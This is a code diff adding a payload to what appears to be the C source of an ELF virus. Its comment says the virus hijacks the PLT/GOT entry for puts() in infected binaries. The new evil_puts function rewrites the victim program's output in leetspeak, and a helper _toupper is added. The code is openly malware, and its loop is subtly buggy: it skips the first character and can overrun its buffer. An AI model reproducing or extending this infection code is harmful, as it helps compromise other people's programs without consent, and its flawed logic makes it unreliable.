@@ -48,6 +48,8 @@ char * _strrchr(const char *, int);
 int _strncmp(const char *, const char *, size_t);
 int _strcmp(const char *, const char *);
 int _memcmp(const void *, const void *, unsigned int);
+char _toupper(char c);
+
 
 /* syscalls */
 long _ptrace(long request, long pid, void *addr, void *data);
@@ -178,6 +180,46 @@ _start()
 	 "pop %rsp	\n"	
 	 "jmp end_code	" 
 	);
+}
+
+/*
+ * l33t sp34k version of puts. We infect PLTGOT
+ * entry for puts() of infected binaries.
+ */
+
+int evil_puts(const char *string)
+{
+	char *s = (char *)string;
+	char new[1024];
+	int index = 0;
+
+	while (*s++ != '\0' && index < 1024) {
+		switch(_toupper(*s)) {
+			case 'I':
+				new[index++] = '1';
+				break;
+			case 'E':
+				new[index++] = '3';
+				break;
+			case 'S':
+				new[index++] = '5';
+				break;
+			case 'T':
+				new[index++] = '7';
+				break;
+			case 'O':
+				new[index++] = '0';
+				break;	
+			case 'A':
+				new[index++] = '4';
+				break;
+			default:
+				new[index++] = *s;
+				break;
+		}
+	}
+	new[index] = '\0';
+	return _puts(new);
 }
 
 /*
@@ -1030,6 +1072,16 @@ size_t _strlen(char *s)
 
         for (sz=0;s[sz];sz++);
         return sz;
+}
+
+	
+
+char _toupper(char c)
+{
+	if( c >='a' && c <= 'z')
+		return (c = c +'A' - 'a');
+	return c;
+	
 }
 
       
